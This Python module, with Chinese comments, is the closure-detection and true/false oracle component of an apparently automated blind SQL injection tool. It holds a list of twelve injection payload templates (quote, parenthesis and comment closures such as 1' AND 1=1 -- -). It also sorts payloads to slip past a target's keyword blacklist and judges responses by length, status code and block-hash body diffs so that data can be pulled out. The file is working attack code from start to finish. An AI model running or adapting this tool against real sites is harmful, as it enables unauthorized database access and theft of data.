"""自动探测闭合方式 + 回显特征

v1.1：
  * 候选里「无注释」写法优先（注释符被禁时少走弯路）
  * 已知黑名单时，命中黑名单的候选排到最后一批（而不是直接丢弃，
    因为有些靶子的黑名单其实没真正生效）

v1.2：
  * 判定信号从「纯长度差」升级为三级信号：长度差 → 状态码差 → 响应体分块 diff。
    解决「true/false 页面长度完全相同」（统一模板 / 统一错误页 / 强 200 同长框架）
    时闭合并法探测直接失败的问题。
  * 基线采样时顺带估计「内容噪声」：页面里的时间戳 / CSRF token / 随机广告位
    会让每次响应都略有不同，噪声越大内容信号的判定门槛就抬得越高，
    避免把随机元素误当成注入回显（这是内容判定最典型的误报来源）。
"""
import hashlib
import statistics


# 比对响应体时的分块大小（字节）
_BLOCK = 64
# 单次比对最多看多少字节，避免超大页面拖慢探测
_DIFF_LIMIT = 200000
# 内容差异度的绝对下限：低于它就认为「页面没变」
MIN_BODY_DIFF = 0.02


def _blocks(text, limit=_DIFF_LIMIT):
    """把响应体切成长度 _BLOCK 的块，返回每块的 md5。

    O(n) 且只哈希一次，比 difflib 的序列比对快得多。
    """
    b = text[:limit].encode("utf-8", "replace")
    return [hashlib.md5(b[i:i + _BLOCK]).digest()
            for i in range(0, len(b), _BLOCK)]


def body_diff(a, b):
    """两段响应体的差异度（0.0 ~ 1.0），按固定块对齐比较。

    对「长度完全相同」的两个响应特别有效：插入/删除整块会立刻体现为差异，
    而纯随机的小改动（时间戳）只影响少数块，占比很低。
    """
    if a == b:
        return 0.0
    ca, cb = _blocks(a), _blocks(b)
    n = max(len(ca), len(cb))
    if n == 0:
        return 0.0
    same = 0
    for x, y in zip(ca, cb):
        if x == y:
            same += 1
    return 1.0 - same / n


def body_gate(noise):
    """由基线噪声推出内容信号的门槛。"""
    return max(MIN_BODY_DIFF, noise * 3)


class Detector:
    def __init__(self, requester, space=" ", log=None, blacklist=None):
        self.req = requester
        self.space = space
        self.log = log
        self.blacklist = blacklist
        self.baseline_median = 0
        self.baseline_jitter = 0
        self.baseline_noise = 0.0
        self.threshold = 5
        self.prefix = None
        self.suffix = None
        self.closure_name = None
        self.true_len = None
        self.false_len = None
        # v1.2：命中时用的信号名，以及 t/f 两份响应体（供长度不可分时落位）
        self.signal = None
        self.true_text = ""
        self.false_text = ""

    def _sample_baseline(self, payload="1", n=3):
        """采样基线：长度中位数 + 抖动幅度 + 内容噪声水平。"""
        samples = []
        for _ in range(n):
            r = self.req.send(payload, use_cache=False)
            if r["status"] != -1:
                samples.append(r)
        if not samples:
            return None
        lens = [s["length"] for s in samples]
        noise = 0.0
        for i in range(len(samples)):
            for j in range(i + 1, len(samples)):
                noise = max(noise, body_diff(samples[i]["text"], samples[j]["text"]))
        return {"median": int(statistics.median(lens)),
                "jitter": max(lens) - min(lens),
                "noise": noise}

    def detect(self):
        print("[*] 基线采样中...")
        base = self._sample_baseline("1", n=3)
        if not base:
            print("[-] 目标不可达")
            return False
        self.baseline_median = base["median"]
        self.baseline_jitter = base["jitter"]
        self.baseline_noise = base["noise"]
        self.threshold = max(5, self.baseline_jitter * 2)
        print(f"[+] 基线: len={self.baseline_median}B "
              f"(抖动±{self.baseline_jitter}B, 内容噪声{self.baseline_noise:.1%})")

        print("[*] 探测闭合方式...")
        if not self._probe_closure():
            print("[!] 12 种闭合候选全部无法区分真假响应")
            print("    常见原因：")
            print("      · 响应长度与内容都完全相同（统一模板 / 统一错误页）")
            print("      · 该参数不存在注入")
            print("      · 参数名不对（--param）或需要认证（--cookie）")
            return False

        print(f"[+] 闭合: {self.closure_name}  (信号: {self.signal})")
        if self.true_len == self.false_len:
            print(f"    True/False 长度相同 ({self.true_len}B)，改用内容差异区分")
        else:
            print(f"    True:  {self.true_len}B")
            print(f"    False: {self.false_len}B")
        return True

    def _candidates(self):
        sp = self.space
        # 无注释写法在前，注释写法在后
        return [
            # ---- 无注释 ----
            ("numeric",            f"1{sp}AND{sp}",     ""),
            ("single-quote",       f"1'{sp}AND{sp}",    f"{sp}AND{sp}'1'='1"),
            ("double-quote",       f'1"{sp}AND{sp}',    f'{sp}AND{sp}"1"="1'),
            ("paren-single",       f"1'){sp}AND{sp}('", f"){sp}AND{sp}'1'='1"),
            ("paren-numeric",      f"1){sp}AND{sp}(",   f"){sp}AND{sp}1=1"),
            # ---- 依赖注释，放后面 ----
            ("numeric(commented)", f"1{sp}AND{sp}",     f"{sp}--{sp}-"),
            ("numeric(#)",         f"1{sp}AND{sp}",     "#"),
            ("single(commented)",  f"1'{sp}AND{sp}",    f"{sp}--{sp}-"),
            ("single(#)",          f"1'{sp}AND{sp}",    "#"),
            ("double(commented)",  f'1"{sp}AND{sp}',    f"{sp}--{sp}-"),
            ("double(#)",          f'1"{sp}AND{sp}',    "#"),
            ("paren-single(cmt)",  f"1'){sp}AND{sp}(",  f")--{sp}-"),
        ]

    def _distinguishable(self, t, f):
        """两个响应是否「可区分」，返回命中的信号名或 None。

        三级降级：
          1. 长度差超阈值   —— 最经典、最可靠
          2. 状态码不同     —— 有些框架真假走不同 HTTP 状态
          3. 响应体分块 diff —— 长度被模板压平时的最后抓手
        """
        if abs(t["length"] - f["length"]) >= self.threshold:
            return "长度"
        if t["status"] != f["status"]:
            return "状态码"
        if body_diff(t["text"], f["text"]) > body_gate(self.baseline_noise):
            return "内容"
        return None

    def _probe_closure(self):
        cands = self._candidates()

        # 分两批：先试「不含被禁 token」的，再试其余
        if self.blacklist and self.blacklist.tokens:
            clean, dirty = [], []
            for c in cands:
                (clean if not self.blacklist.is_blocked(c[1] + "1=1" + c[2]) else dirty).append(c)
            batches = [clean, dirty]
        else:
            batches = [cands]

        for batch in batches:
            for name, prefix, suffix in batch:
                t = self.req.send(prefix + "1=1" + suffix)
                f = self.req.send(prefix + "1=2" + suffix)
                if t["status"] == -1 or f["status"] == -1:
                    continue
                sig = self._distinguishable(t, f)
                if not sig:
                    continue
                self.prefix, self.suffix = prefix, suffix
                self.closure_name = name
                self.signal = sig
                self.true_len, self.false_len = t["length"], f["length"]
                self.true_text, self.false_text = t["text"], f["text"]
                return True
        return False

    def build(self, condition):
        return self.prefix + condition + self.suffix

    def is_true(self, condition):
        r = self.req.send(self.build(condition))
        if r["status"] == -1:
            return None
        if self.true_len != self.false_len:
            mid = (self.true_len + self.false_len) / 2
            if self.true_len > self.false_len:
                return r["length"] > mid
            return r["length"] < mid
        # 长度不可分（靠状态码/内容判出的闭合）→ 用响应体相似度落位：
        # 谁更接近「全真样本」就是真。两次请求本身有噪声，
        # 但噪声是双向的，比较相对距离即可抵消。
        return body_diff(r["text"], self.true_text) <= body_diff(r["text"], self.false_text)
